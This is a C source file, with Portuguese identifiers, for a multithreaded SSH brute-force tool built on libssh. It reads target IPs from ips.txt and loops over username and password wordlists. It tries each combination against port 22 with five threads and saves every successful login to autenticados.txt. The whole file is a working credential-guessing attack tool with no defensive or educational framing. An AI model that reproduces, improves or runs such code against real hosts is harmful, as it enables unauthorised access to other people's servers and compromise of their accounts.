#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <pthread.h>

// gcc -o ssh ssh.c -lssh -lpthread

#define MAX_TH 	5
#define MAX_ERRO 50

void autentica(char *host, char *user, char *password, int porta);
void InitPilha();
void empilha(char ip[30], int porta, char user[50], char pass[50]);
void desempilha(char *ip, int *porta, char *user, char *pass);
void *worker();
void grava(char arquivo[], char *texto);
int pilhaVazia();

 
struct node {
    char user[50];
    char pass[50];
    int porta;
    char ip[30];
    struct node * prox;
};
struct node *pilhaptr;


pthread_mutex_t lock;
pthread_cond_t cond;

int erros = 0;
int encontrou = 0;
 
int main(){

	FILE 		*fp, *fp2, *fp3;
	char 		*ip 	= NULL;
	char 		*user 	= NULL;
	char 		*pass 	= NULL;
	
	pthread_t 	th[MAX_TH];
	int 		ti, porta;
	
	size_t 		len 	= 0;
	size_t 		len2 	= 0;
	size_t 		len3 	= 0;
	
	ssize_t 	read;
	ssize_t 	read2;
	ssize_t 	read3;
	
	porta = 22;

 	
 	fp = fopen("ips.txt", "r");
	if (fp == NULL){
    		printf("Arquivo ips.txt não encontrado\n");
        	exit(EXIT_FAILURE);
	}
    

    	pthread_mutex_init(&lock, NULL);
	pthread_cond_init(&cond, NULL);      
	
    	while ((read = getline(&ip, &len, fp)) != -1) {
    		encontrou = 0;
    		erros = 0;
    		InitPilha();

    	 	fp2 = fopen("users.txt", "r");
		if (fp2 == NULL){
	    		printf("Arquivo users.txt não encontrado\n");
	        	exit(EXIT_FAILURE);
		}
    		while ((read2 = getline(&user, &len2, fp2)) != -1) {
    		 	fp3 = fopen("pass.txt", "r");
			if (fp3 == NULL){
    				printf("Arquivo pass.txt não encontrado\n");
        			exit(EXIT_FAILURE);
			}
    			while ((read3 = getline(&pass, &len3, fp3)) != -1 && encontrou == 0 && erros < MAX_ERRO) {
    				ip[strcspn(ip, "\n")] = 0;
    				user[strcspn(user, "\n")] = 0;
    				pass[strcspn(pass, "\n")] = 0;
    				ip[strcspn(ip, "\r\n")] = 0;
    				user[strcspn(user, "\r\n")] = 0;
    				pass[strcspn(pass, "\r\n")] = 0;
        			empilha(ip, porta, user, pass);
        		}
        		fclose(fp3);
        		
			if(pilhaVazia() != 1 && encontrou == 0 && erros < MAX_ERRO){
		        	for(ti = 0; ti <MAX_TH; ti++){
        				pthread_create(&th[ti], NULL, worker, NULL);
        			}
        			for(ti = 0; ti <MAX_TH; ti++){
            				pthread_join(th[ti], NULL);
        			}
    			}        		
        	}
        	fclose(fp2);
        	sleep(5);
    	}

	fclose(fp);

    	if (ip){
        	free(ip);
    	} 	
    	if (user){
        	free(user);
    	} 	
    	if (pass){
        	free(pass);
    	} 	
   	  	
    	sleep(1);    	
    	return EXIT_SUCCESS;
}



void autentica(char *host, char *user, char *password, int porta){
	ssh_session my_ssh_session;
	int rc, timeout = 10;
	char str[200];
	
	
	my_ssh_session = ssh_new();
	if (my_ssh_session == NULL)
    		return;
  	ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, host);
  	ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &porta);
  	ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, user);
  	ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &timeout);
  	rc = ssh_connect(my_ssh_session);
	if (rc != SSH_OK){
		ssh_free(my_ssh_session);
		erros++;
		return;
	}
 
 	rc = ssh_userauth_password(my_ssh_session, NULL, password);
 	if (rc != SSH_AUTH_SUCCESS){
		ssh_disconnect(my_ssh_session);
		ssh_free(my_ssh_session);
    		return;
  	}
	else{
		encontrou = 1;
		printf("Autenticado %s:%d %s:%s\n", host, porta, user, password);
		sprintf(str, "Autenticado %s:%d %s:%s\n", host, porta, user, password);
		grava("autenticados.txt", str);
		ssh_disconnect(my_ssh_session);
		ssh_free(my_ssh_session);
	}
}

void InitPilha(){
    pilhaptr = NULL;
}

int pilhaVazia(){
    if(pilhaptr == NULL) return 1;
    else return 0;
}

void empilha(char ip[30], int porta, char user[50], char pass[50]){
	struct node *p;
	p = malloc(sizeof(struct node));
	strcpy(p->user, user);
	strcpy(p->pass, pass);
    	p->porta = porta;
	strcpy(p->ip, ip);
	p->prox = pilhaptr;
	pilhaptr = p;
}

void desempilha(char *ip, int *porta, char *user, char *pass){
	struct node *p;
	p = pilhaptr;
	if(p==0) printf("Pilha vazia\n");
	else{
        	pilhaptr = p->prox;
	        strcpy(ip, p->ip);
	        strcpy(user, p->user);
	        strcpy(pass, p->pass);
        	memcpy(porta, &p->porta, sizeof(int));
    }
}

void *worker(){
	char ip[30], user[50], pass[50];
	int porta;

	while(pilhaVazia() != 1 && erros < MAX_ERRO && encontrou == 0){
        	pthread_mutex_lock(&lock);
        	desempilha(ip, &porta, user, pass);
        	pthread_cond_signal(&cond);
        	pthread_mutex_unlock(&lock);
        	autentica(ip, user, pass, porta);
    	}
    	
    	while(pilhaVazia() != 1){
    		pthread_mutex_lock(&lock);
    		desempilha(ip, &porta, user, pass);
        	pthread_cond_signal(&cond);
        	pthread_mutex_unlock(&lock);    	
    	}

}

void grava(char arquivo[], char *texto){
        FILE *fp;
        if((fp = fopen(arquivo, "a+")) != NULL){
                fprintf(fp, "%s\n", texto);
                if(fclose(fp)){
                        printf("Erro ao fechar %s\n", arquivo);
                }
        }
}     
